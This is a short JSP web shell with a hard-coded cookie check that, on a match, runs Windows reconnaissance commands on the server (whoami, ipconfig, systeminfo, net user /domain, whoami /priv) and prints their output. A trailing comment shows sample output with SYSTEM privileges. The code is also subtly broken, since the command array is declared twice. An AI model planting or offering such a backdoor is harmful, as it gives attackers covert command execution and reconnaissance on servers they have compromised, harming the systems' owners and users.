<%@ page import="java.io.*" %>
<%
    String cookieValue = "your_cookie_value"; // replace with your cookie value
    String inputCookieValue = request.getCookies()[0].getValue(); // assuming the cookie you want is the first one

    if (cookieValue.equals(inputCookieValue)) {
        String[] commands = {"whoami", "ipconfig", "systeminfo", "net user /domain", "whoami /priv"};
        String[] commands = {"whoami", "ipconfig", "systeminfo"};
        for (String command : commands) {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                out.println(line + "<br/>");
            }
        }
    } else {
        out.println("Access denied.");
    }
%>
/*
NT AUTHORITY\SYSTEM<br/>
Windows IP Configuration
...
Ethernet adapter Ethernet0:
...
IPv4 Address. . . . . . . . . . . : 192.168.1.10
...
OS Name:                   Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
...
User accounts for \\server-web-1
...
NT AUTHORITY\SYSTEM         SeChangeNotifyPrivilege
...
*/
